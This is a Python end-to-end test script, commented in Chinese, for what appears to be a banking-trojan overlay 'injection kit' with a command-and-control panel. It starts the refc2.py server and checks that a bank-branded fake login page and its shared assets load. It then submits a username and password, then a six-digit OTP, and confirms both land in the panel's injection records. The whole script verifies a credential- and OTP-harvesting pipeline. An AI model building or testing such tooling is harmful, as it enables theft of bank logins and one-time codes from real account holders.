#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""注入套件端到端判据（含本轮重写的共享资源 bank.css / bank.js / i18n.json.js）。

1) 注入页可取（免鉴权，与原版一致）
2) 三个共享资源可取且 MIME 正确
3) 模板里引用的 DOM id / 配置字段齐全（bank.js 的契约）
4) 回填数据可回收（POST /api/EaodBankInject.php -> {ok:true,next:otp} 且入库）
退出码 0 = 全通过。
"""
import io, json, os, re, subprocess, sys, time, urllib.error, urllib.parse, urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(HERE, 'materials', 'inject')
HOST, PORT = '127.0.0.1', 8805
BASE = 'http://%s:%d' % (HOST, PORT)
REQUIRED_IDS = ['bk_logo', 'bk_name', 'bk_sub', 'bk_h1', 'bk_h2', 'bk_u_label', 'bk_p_label',
                'bk_err', 'bk_btn', 'bk_step2', 'bk_o_h1', 'bk_o_h2', 'bk_o_label', 'bk_err2',
                'bk_btn2', 'bk_safe', 'bk_foot']


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=15) as r:
            return r.status, r.read().decode('utf-8', 'replace'), r.headers.get('Content-Type', '')
    except urllib.error.HTTPError as e:
        return e.code, e.read(200).decode('utf-8', 'replace'), ''


def post_form(path, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8')
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read(200).decode('utf-8', 'replace')


def main():
    env = dict(os.environ, REFC2_USER='admin', REFC2_PASS='CHANGE_ME',
               PYTHONIOENCODING='utf-8')
    srv = subprocess.Popen([sys.executable, os.path.join(HERE, 'server', 'refc2.py'),
                            '--host', HOST, '--port', str(PORT)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
    checks, fails = [], []

    def ck(name, ok, detail=''):
        checks.append({'check': name, 'ok': bool(ok), 'detail': str(detail)[:160]})
        if not ok:
            fails.append(name)
        print('%-40s %s  %s' % (name, 'OK' if ok else 'FAIL', str(detail)[:80]))

    try:
        for _ in range(60):
            try:
                if get('/api/health')[0] == 200:
                    break
            except Exception:
                pass
            time.sleep(0.25)

        # 1) 注入页
        st, html, ct = get('/api/EaodBankInject.php?action=page&id=1')
        ck('注入页可取（免鉴权）', st == 200 and 'text/html' in ct, '%s %s' % (st, ct))
        # 2) 共享资源
        for name, want in (('bank.css', 'css'), ('bank.js', 'javascript'),
                           ('i18n.json.js', 'javascript')):
            st, body, ct = get('/bank/assets/' + name)
            ck('共享资源 /bank/assets/%s' % name,
               st == 200 and want in ct and len(body) > 200, '%s %s %dB' % (st, ct, len(body)))
        # 3) 模板契约：DOM id 与 __BK 字段
        missing = [i for i in REQUIRED_IDS if ('id="%s"' % i) not in html]
        ck('模板 DOM 契约完整（bank.js 依赖）', not missing, ('缺:' + ','.join(missing)) if missing else '17/17')
        cfg = re.search(r'window\.__BK\s*=\s*(\{.*?\});', html, re.S)
        keys = sorted(json.loads(cfg.group(1)).keys()) if cfg else []
        need_cfg = ['api', 'bank', 'cc', 'digits', 'flow', 'lang', 'mode', 'pid', 'words']
        ck('__BK 配置字段齐全', all(k in keys for k in need_cfg), ','.join(keys[:10]))
        # bank.js 是否真的引用了这些 id（防止"资源在但没接线"）
        js = io.open(os.path.join(INJ, 'bank.js'), encoding='utf-8').read()
        wired = [i for i in REQUIRED_IDS if i in js]
        ck('bank.js 接线到模板 DOM', len(wired) >= 15, '%d/%d' % (len(wired), len(REQUIRED_IDS)))
        i18n = io.open(os.path.join(INJ, 'i18n.json.js'), encoding='utf-8').read()
        ck('i18n 提供多语言', i18n.count('"zh-CN"') >= 1 and '"en"' in i18n and '"th"' in i18n,
           'langs=%d' % i18n.count('":{'))

        # 4) 回填回收（两步）
        st, b1 = post_form('/api/EaodBankInject.php',
                           {'pid': 'probe-dev-01', 'bank': '中国工商银行', 'step': '1',
                            'u': 'probe_user', 'p': 'probe_pass', 'cc': 'custom', 'digits': '6'})
        j1 = json.loads(b1) if b1.startswith('{') else {}
        ck('第一步回填被接收（next=otp）', st == 200 and j1.get('next') == 'otp', b1[:80])
        st, b2 = post_form('/api/EaodBankInject.php',
                           {'pid': 'probe-dev-01', 'bank': '中国工商银行', 'step': '2',
                            'o': '654321'})
        j2 = json.loads(b2) if b2.startswith('{') else {}
        ck('第二步回填被接收（next=done）', st == 200 and j2.get('next') == 'done', b2[:80])
        # 入库（面板注入记录可见）
        import urllib.request as _u
        lreq = _u.Request(BASE + '/api/login', method='POST',
                          data=json.dumps({'username': 'admin',
                                           'password': 'CHANGE_ME'}).encode(),
                          headers={'Content-Type': 'application/json'})
        tok = json.loads(_u.urlopen(lreq, timeout=15).read().decode())['token']
        req = _u.Request(BASE + '/api/inj/records?id=probe-dev-01')
        req.add_header('Authorization', 'Bearer ' + tok)
        recs = json.loads(_u.urlopen(req, timeout=15).read().decode())
        got = recs.get('records') if isinstance(recs, dict) else recs
        ck('回填进入服务端记录', bool(got),
           'records=%s' % (len(got) if hasattr(got, '__len__') else got))

        print('\n注入套件：%d/%d 通过' % (len(checks) - len(fails), len(checks)))
        out = os.path.join(HERE, 'evidence', '149_inject_e2e.json')
        json.dump({'passed': len(checks) - len(fails), 'total': len(checks), 'checks': checks},
                  io.open(out, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
        print('->', os.path.normpath(out))
        return 0 if not fails else 1
    finally:
        srv.terminate()


if __name__ == '__main__':
    sys.exit(main())
